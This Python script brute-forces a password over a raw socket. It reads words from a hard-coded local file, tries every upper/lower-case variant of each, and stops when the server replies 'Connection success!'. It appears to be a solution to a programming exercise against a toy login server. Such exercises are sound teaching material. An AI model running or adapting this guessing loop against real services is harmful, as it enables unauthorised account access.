import sys
import socket
import io
import itertools

args = sys.argv
host = args[1]
port = int(args[2])
buffer_size = 1024
with socket.socket() as sock:
    sock.connect((host, port))
    stop = False
    with io.open('c:\\Users\\Gena\\Downloads\\logins.txt', 'r') as file:
        for line in file:
            if stop:
                break
            line = line.strip()
            for item in itertools.product(*zip(line.upper(), line.lower())):
                password = ''.join(item)
                sock.send(password.encode())
                response = sock.recv(buffer_size).decode()
                if response == 'Connection success!':
                    print(password)
                    stop = True
                    break
